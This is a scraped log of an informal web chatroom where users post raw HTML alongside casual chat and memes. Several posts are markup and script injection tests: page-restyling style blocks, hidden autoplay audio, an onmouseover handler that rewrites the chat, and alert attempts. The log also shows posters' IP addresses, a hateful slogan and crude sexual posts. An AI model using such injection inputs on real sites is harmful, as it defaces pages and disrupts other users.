+[2023/01/28 14:55:20][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> at the moment u cant upload files yet but soon u can <br></d;v>
+[2023/01/28 14:54:51][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> hai<br></d;v>
+[2023/01/28 14:54:40][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> i'll add options in the future to allow viewing @bsolute<br></d;v>
+[2023/01/28 14:54:06][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> helo<br></d;v>
+[2023/01/28 14:47:33][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> oh thats a
+<br>
+<br>thats an image ontop of the screen<br></d;v>
+[2023/01/28 14:46:53][77.243.25.8]<d;v> Hi<br></d;v>
+[2023/01/28 14:46:35][77.243.25.8]<d;v> <d;v style="position: @bsolute; z-index: 3; width:500px; height:300px; background:white"> 📁Local Disk (C:)
+<br>└📁Program Files (x86)
+<br>⠀└📁win7
+<br>⠀⠀└📁Desktop 
+<br>⠀⠀⠀└💽server.exe
+<br>⠀⠀⠀└🐢turtle.exe
+<br>📁TempleOS (D:)
+<br>└📁Graphics
+<br>⠀└🕷️ game.HC </d;v><br></d;v>
+[2023/01/28 14:42:24][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> overflowing other text tho somehow heh<br></d;v>
+[2023/01/28 14:41:57][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> nice graphics<br></d;v>
+[2023/01/28 14:39:35][77.243.25.8]<d;v> <d;v style="position: @bsolute; z-index: 3; width:500px; height:300px; background:white"> 📁Local Disk (C:)
+<br>└📁Program Files (x86)
+<br>⠀└📁win7
+<br>⠀⠀└📁Desktop 
+<br>⠀⠀⠀└💽server.exe
+<br>⠀⠀⠀└🐢turtle.exe
+<br>📁TempleOS (D:)
+<br>└📁Graphics
+<br>⠀└🕷️ game.HC </d;v><br></d;v>
+[2023/01/28 13:51:56][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> maybe<br></d;v>
+[2023/01/28 13:47:32][77.41.190.13]<d;v> You should play Rain world downpour<br></d;v>
+[2023/01/28 13:24:49][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> bluename<br></d;v>
+[2023/01/28 13:24:00][1.127.30.42]<d;v> g<br></d;v>
+[2023/01/28 13:22:26][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> test<br>
+[2023/01/28 13:17:24][60.242.253.123]<d;v> <t@ble>
+<br>hi
+<br>wassup
+<br>helo
+<br>
+<br><br></t@ble></d;v>
+[2023/01/28 13:07:40][60.242.253.123]<d;v> <h1></h1><br></d;v>
+[2023/01/28 12:18:02][84.216.119.49]<d;v> <a onmouseover="d0cument.getElementById('chathere').innerHTML = 'PROJECT BLUE BEAM IS REAL. PREPARE FOR FAKE ALIENS';">Hover 4 da truth</a><br></d;v>
+[2023/01/28 12:06:52][188.120.99.30]<d;v> <link rel="stylesheet" href="Welcome%20To%20My%20Web%20Site%20)_files/icon.css">
+<br>
+<br><d;v class="nav-container">
+<br>  <d;v class="nav-butt0ns">
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n">Home</butt0n></d;v>
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n"></butt0n></d;v>
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n"></butt0n></d;v>
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n"></butt0n></d;v>
+<br>  </d;v>
+<br>  <d;v class="nav-login">
+<br>    <d;v class="login"><butt0n class="nv-log" onclick="location.href='#'" type="butt0n"><i class="material-icons">person</i></butt0n>
+<br>  </d;v>
+<br></d;v><br>&lt; d;v=""&gt;
+[2023/01/28 12:02:24][188.120.99.30]<d;v> <link rel="stylesheet" href="Welcome%20To%20My%20Web%20Site%20)_files/icon.css">
+<br>
+<br><d;v class="nav-container">
+<br>  <d;v class="nav-butt0ns">
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n">Home</butt0n></d;v>
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n"></butt0n></d;v>
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n"></butt0n></d;v>
+<br>    <d;v class="nav-butt0n"><butt0n class="nv-btn" onclick="location.href='#'" type="butt0n"></butt0n></d;v>
+<br>  </d;v>
+<br>  <d;v class="nav-login">
+<br>    <d;v class="login"><butt0n class="nv-log" onclick="location.href='#'" type="butt0n"><i class="material-icons">person</i></butt0n>
+<br>  </d;v>
+<br></d;v><br></d;v>
+[2023/01/28 12:01:08][188.120.99.30]<d;v> <h1 style="“color:red”">This site is haram<h1xd< button=""></h1xd<></h1><br></d;v>
+[2023/01/28 11:59:18][188.120.99.30]<d;v> <style>
+<br>  bod¥ {color:red;}
+<br></style><br></d;v>
+[2023/01/28 11:58:54][188.120.99.30]<d;v> <style>
+<br>  bod¥ {color:white;background:black;}
+<br></style><br></d;v>
+[2023/01/28 11:58:48][188.120.99.30]<d;v> <style>
+<br>  bod¥ {color:white;background:black;}
+<br></style><br></d;v>
+[2023/01/28 11:51:49][84.216.119.49]<d;v> <audio preload="true" src="Welcome%20To%20My%20Web%20Site%20)_files/killsound_a9a39.mp3" controls="controls" autoplay="autoplay" class="Preview" visibility="hide" style="display:none;"></audio><br></d;v>
+[2023/01/28 11:48:57][84.216.119.49]<d;v> <audio preload="none" src="Welcome%20To%20My%20Web%20Site%20)_files/killsound_a9a39.mp3" controls="controls" autoplay="autoplay" class="Preview" visibility="hide" style="display:none;"></audio><br></d;v>
+[2023/01/28 11:48:41][84.216.119.49]<d;v> <b>Hello</b><br></d;v>
+[2023/01/28 11:47:42][188.120.99.30]<d;v> Eat up<br></d;v>
+[2023/01/28 11:47:34][188.120.99.30]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/IMG_3281.jpg" alt="whooloo"><br></d;v>
+[2023/01/28 11:44:14][60.242.253.123]<d;v> im testing out (accounts)<br></d;v>
+[2023/01/28 11:43:55][60.242.253.123]<d;v> ah ur so funny<br></d;v>
+[2023/01/28 11:43:55][188.120.99.30]<d;v> Jeff<br></d;v>
+[2023/01/28 11:43:45][188.120.99.30]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/314px-Original_cobson.jpeg" alt="whooloo"><br></d;v>
+[2023/01/28 11:41:05][60.242.253.123]<d;v> who are u<br></d;v>
+[2023/01/28 11:37:29][188.120.99.30]<d;v> My name is Jeff <br></d;v>
+[2023/01/28 11:27:40][<a href="http://60.242.253.123/global%3Ca%20href='/global//60.242.253.123'%3E/60.242.253.123%3C/a%3E">60.242.253.123</a>]<d;v> blue names if you have an accnt<br>
+[2023/01/28 11:27:05][<a href="http://60.242.253.123/global%3Ca%20href='/global//60.242.253.123'%3E/60.242.253.123%3C/a%3E">'60.242.253.123</a>]<d;v> testing<br></d;v>
+[2023/01/28 11:03:03][60.242.253.123]<d;v> <!--?)hp</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:16:25][60.242.253.123]<d;v> berserking time</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:16:15][60.242.253.123]<d;v> alrigh</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:16:04][60.242.253.123]<d;v> a</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:14:16][60.242.253.123]<d;v> <d;v style="color:red;"> hello</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:13:35][60.242.253.123]<d;v> one thing</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:12:55][60.242.253.123]<d;v> ff</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 09:12:41][60.242.253.123]<d;v> it starts wi</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:43:14][60.242.253.123]<d;v> <iframe src="https://cdn.htmlgames.com/DunkBalls/" height="1000px"></iframe></button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:43:02][60.242.253.123]<d;v> <iframe src="https://cdn.htmlgames.com/DunkBalls/" height="200%"></iframe></button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:42:48][60.242.253.123]<d;v> <iframe src="https://cdn.htmlgames.com/DunkBalls/" height="320"></iframe></button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:42:03][60.242.253.123]<d;v> <iframe src="https://cdn.htmlgames.com/DunkBalls/" width="200%" height="200%"></iframe></button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:41:51][60.242.253.123]<d;v> <iframe src="https://cdn.htmlgames.com/DunkBalls/" width="100%" height="100%"></iframe></button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:40:13][60.242.253.123]<d;v> BRUH</button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:39:57][60.242.253.123]<d;v> <iframe src="https://cdn.htmlgames.com/DunkBalls/"></iframe></button></form></h1></ul></iframe><br></d;v>
+[2023/01/28 05:37:42][60.242.253.123]<d;v> <d;v>&lt;$cript src="https://cdn.htmlgames.com/embed.js?game=JewelRush&amp;bgcolor=white"&gt;<!--$cript--></d;v><br>
+[2023/01/28 05:32:11][60.242.253.123]<d;v> </d;v><li> list of </li>
+<br><li> 1. apples </li>
+<br><li> 2. caramel </li><br></d;v>
+[2023/01/28 05:31:41][60.242.253.123]<d;v> <li><br>
+[2023/01/28 05:26:49][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/giphy_002.gif"><br></d;v>
+[2023/01/28 05:26:38][60.242.253.123]<d;v> insane<br></d;v>
+[2023/01/28 05:26:28][172.10.165.215]<d;v>  <img src="Welcome%20To%20My%20Web%20Site%20)_files/1674318691947208.png" alt="Duke"> <br></d;v>
+[2023/01/28 05:25:11][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/half-life2-linkin-park-it-starts-with-one-thing-hl2-hl2meme.html"><br></d;v>
+[2023/01/28 05:24:54][172.10.165.215]<d;v>  <img src="Welcome%20To%20My%20Web%20Site%20)_files/IMG_20230123_104713_798.jpg" alt="HALF LIFE TESTING"> <br></d;v>
+[2023/01/28 05:23:06][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/latest"><br></d;v>
+[2023/01/28 05:22:12][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/latest"><br></d;v>
+[2023/01/28 05:20:00][60.242.253.123]<d;v> the isp looking at the packets:<br></d;v>
+[2023/01/28 05:19:57][172.10.165.215]<d;v> <font size="72">  
+<br>    BOOBS!!! 
+<br></font>  <br></d;v>
+[2023/01/28 05:19:36][60.242.253.123]<d;v> remember whatever u say here can be seen by all that enter this ip address<br></d;v>
+[2023/01/28 05:19:03][172.10.165.215]<d;v> <font size="+16">DEATH TO ISRAEL!!!!</font><br></d;v>
+[2023/01/28 05:18:59][60.242.253.123]<d;v> frr<br></d;v>
+[2023/01/28 05:18:25][172.10.165.215]<d;v> <font size="+8"> Fuck ARM. x86 4 lyfe!! </font><br></d;v>
+[2023/01/28 05:17:21][172.10.165.215]<d;v> <h1> I WANT TO IMPREGNATE LONG HAIRED AND SOFT SKINNED ELVES!! </h1><br></d;v>
+[2023/01/28 05:16:43][172.10.165.215]<d;v> bruh bruh bruh
+<br><br></d;v>
+[2023/01/28 05:13:26][60.242.253.123]<d;v> 
+<br>
+<br><d;v style="border-style:solid;size:2px;color:yellow;"> yello<br></d;v>
+[2023/01/28 05:13:05][60.242.253.123]<d;v> <d;v style="border-style:solid;size:2px;color:yellow;"> yello<br></d;v>
+[2023/01/28 05:12:27][60.242.253.123]<d;v> <d;v style="border-style:solid 2px;color:yellow;"> yello<br></d;v>
+[2023/01/28 05:12:01][60.242.253.123]<d;v> <d;v style="border:2px;color:yellow;"> yello<br></d;v>
+[2023/01/28 05:11:14][60.242.253.123]<d;v> <t@ble>
+<br>this
+<br>is
+<br>me
+<br></t@ble><br></d;v>
+[2023/01/28 05:10:21][60.242.253.123]<d;v> <t@ble>
+<br>
+<br>
+<br><br></t@ble></d;v>
+[2023/01/28 05:10:07][60.242.253.123]<d;v> t@ble<br></d;v>
+[2023/01/28 05:05:28][60.242.253.123]<d;v> <br></d;v>
+[2023/01/28 05:05:21][60.242.253.123]<d;v> <br></d;v>
+[2023/01/28 05:04:48][60.242.253.123]<d;v> <t@ble><br></t@ble></d;v>
+[2023/01/28 05:00:10][60.242.253.123]<d;v> m goin undr<br></d;v>
+[2023/01/28 04:46:18][60.242.253.123]<d;v> abcd<br></d;v>
+[2023/01/28 03:35:43][60.242.253.123]<d;v> please be civil<br></d;v>
+[2023/01/28 03:35:29][1.159.180.238]<d;v> Nigeria<br></d;v>
+[2023/01/28 03:22:51][60.242.253.123]<d;v> d;v<br></d;v>
+[2023/01/28 03:21:41][60.242.253.123]<d;v> u need to put in a $cript but ive took initiative to disable it
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/giphy.gif"><br></d;v>
+[2023/01/28 03:19:26][24.200.190.166]<d;v> &lt;$cript src="console.log('IM IN YOUR CONSOLE\'S WALLS!!!')"XD<br></d;v>
+[2023/01/28 03:18:51][24.200.190.166]<d;v> &lt;$cript&gt; @lert('I LIVE IN YOUR WALLS!!!'); <!--$cript--> <br></d;v>
+[2023/01/28 03:18:17][24.200.190.166]<d;v> &lt;$cript src="@lert("IM IN YOUR WALLS!!!!!!!111111111");"XD<br>&lt;="" d;v=""&gt;
+[2023/01/28 03:18:00][24.200.190.166]<d;v> @lert("IM IN YOUR WALLS!!!!!!!111111111");<br></d;v>
+[2023/01/28 03:17:28][24.200.190.166]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/cobson.png" xd<="" button=""><br></d;v>
+[2023/01/28 03:17:14][24.200.190.166]<d;v> https://autumn.revolt.chat/attachments/yPQPNh2g2L_41gjQ0Q2XlxBnBEwZWywYZjMPZ8RWUt/cobson.png<br></d;v>
+[2023/01/28 03:16:54][24.200.190.166]<d;v> y4: IM IN YOUR WALLS!<br></d;v>
+[2023/01/28 03:16:07][60.242.253.123]<d;v> not here<br></d;v>
+[2023/01/28 03:15:44][83.97.23.90]<d;v> <h1>HWABAG</h1>
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/cobson.png">
+<br><h1>HWABAG</h1><br></d;v>
+[2023/01/28 03:14:29][172.58.137.13]<d;v> post blue rabbjt<br></d;v>
+[2023/01/28 03:11:01][60.242.253.123]<d;v> what the hell this image is huge<br></d;v>
+[2023/01/28 03:10:47][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/EYElwEuVAAAG1uc.jpg"><br></d;v>
+[2023/01/28 03:09:05][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/200.gif"><br></d;v>
+[2023/01/28 03:06:20][172.58.137.13]<d;v> grandpa are you really shitting??<br></d;v>
+[2023/01/28 03:05:53][95.174.67.50]<d;v> <h1>OHHHHHHHH! I'M SHITTING!</h1><br></d;v>
+[2023/01/28 03:05:17][172.58.137.13]<d;v> DAN DAN DUUUU<br></d;v>
+[2023/01/28 03:05:01][60.242.253.123]<d;v> people in 2007: what is a vpn<br></d;v>
+[2023/01/28 03:04:09][95.174.67.50]<d;v> dont dox me pls<br></d;v>
+[2023/01/28 03:03:39][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/zsi67-.gif"><br></d;v>
+[2023/01/28 03:03:27][172.58.137.13]<d;v> thats roald mac donald<br></d;v>
+[2023/01/28 03:02:20][60.242.253.123]<d;v> ip grabbing is a modern hysteria i have no use for ip addresses<br></d;v>
+[2023/01/28 03:01:53][60.242.253.123]<d;v> share -&gt; &lt; &gt; embed<br></d;v>
+[2023/01/28 03:01:46][95.174.67.50]<d;v> ip grabber lol<br></d;v>
+[2023/01/28 03:01:44][60.242.253.123]<d;v> embed ur videos dummy<br></d;v>
+[2023/01/28 03:00:31][71.19.249.81]<d;v> https://www.youtube.com/watch?v=VIvS2ko-k1k queen<br></d;v>
+[2023/01/28 03:00:14][60.242.253.123]<d;v> arghhh!!!<br></d;v>
+[2023/01/28 03:00:02][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/giphy_003.gif"><br></d;v>
+[2023/01/28 02:58:36][172.58.137.13]<d;v> knife<br></d;v>
+[2023/01/28 02:58:19][60.242.253.123]<d;v> what<br></d;v>
+[2023/01/28 02:57:13][172.58.137.13]<d;v> hey carb guess uhat<br></d;v>
+[2023/01/28 02:53:13][60.242.253.123]<d;v> u forgor embedd!!<br></d;v>
+[2023/01/28 02:50:38][60.242.253.123]<d;v> who r u<br></d;v>
+[2023/01/28 02:47:45][172.58.137.13]<d;v> https://youtu.be/ccan_v6tLaY<br></d;v>
+[2023/01/28 02:41:12][172.58.137.13]<d;v> u just wanted to grab my ip u SWINE smh😤😤<br></d;v>
+[2023/01/28 02:39:46][156.146.59.15]<d;v> fart like a boss <br></d;v>
+[2023/01/28 02:38:41][60.242.253.123]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/2R6S5CJWlco.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 02:37:08][60.242.253.123]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/xvFZjo5PgG0.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 02:36:23][60.242.253.123]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/dQw4w9WgXcQ.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 02:34:37][60.242.253.123]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/rvYZRskNV3w.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 02:33:27][60.242.253.123]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/tAknJFNai3Y.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 02:32:46][60.242.253.123]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/M9J6DKJXoKk.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 02:31:09][60.242.253.123]<d;v> <iframe src="https://www.youtube.com/watch?v=M9J6DKJXoKk"></iframe><br></d;v>
+[2023/01/28 02:20:58][60.242.253.123]<d;v> <d;v style="color:green;font-size:100px;">hacking<br></d;v>
+[2023/01/28 02:20:17][60.242.253.123]<d;v> <d;v style="color:green;font-size:large;">bigtext lmao<br></d;v>
+[2023/01/28 02:19:45][60.242.253.123]<d;v> <d;v style="color:red;font-size:15px;">bigtext lmao<br></d;v>
+[2023/01/28 02:18:25][60.242.253.123]<d;v> you too dud<br></d;v>
+[2023/01/28 02:16:31][118.200.29.115]<d;v> You rock, I love you man!<br></d;v>
+[2023/01/28 02:13:27][60.242.253.123]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/Trollface_non-free.png"> <br></d;v>
+[2023/01/28 02:10:44][60.242.253.123]<d;v> <!--?)hp echo "broke lmao" ?--><br></d;v>
+[2023/01/28 02:02:10][60.242.253.123]<d;v> ello<br></d;v>
+[2023/01/28 02:00:36][60.242.253.123]<d;v> 
+<br>e
+<br>n
+<br>t
+<br>e
+<br>r<br></d;v>
+[2023/01/28 02:00:19][60.242.253.123]<d;v> 1
+<br>2
+<br>3
+<br>4<br></d;v>
+[2023/01/28 01:59:03][60.242.253.123]<d;v> abcd
+efg<br></d;v>
+[2023/01/28 01:55:36][60.242.253.123]<d;v> d<br></d;v>
+[2023/01/28 01:54:07][60.242.253.123]<d;v> t
+e
+s
+t
+i
+n
+g<br></d;v>
+[2023/01/28 01:44:38][60.242.253.123]<d;v> <br>
+<br></d;v>
+[2023/01/28 01:43:03][60.242.253.123]<d;v> ehehe<br></d;v>
+[2023/01/28 01:42:18][60.242.253.123]<d;v> j <br>
+k <br>
+l <br>
+m <br><br></d;v>
+[2023/01/28 01:41:55][60.242.253.123]<d;v> <d;v> lepeic </d;v></d;v><br></d;v>
+[2023/01/28 01:41:21][60.242.253.123]<d;v> <d;v style="color:red"> i cant overwrite noooo
+<br></d;v>
+[2023/01/28 01:41:00][60.242.253.123]<d;v> he<br></d;v>
+[2023/01/28 01:40:56][60.242.253.123]<d;v> <d;v style="color:green"> try<br></d;v>
+[2023/01/28 01:40:45][60.242.253.123]<d;v> d<br></d;v>
+[2023/01/28 01:40:41][60.242.253.123]<d;v> <d;v style="green">overwrite!</d;v><br>[2023/01/28 01:40:16][60.242.253.123]<d;v> h<br></d;v></d;v></d;v></d;v></d;v></d;v></d;v></d;v></d;v></d;v></d;v></li></d;v></d;v></d;v></d;v></d;v></d;v></d;v></bod¥></div>
+
+
+</body></html>
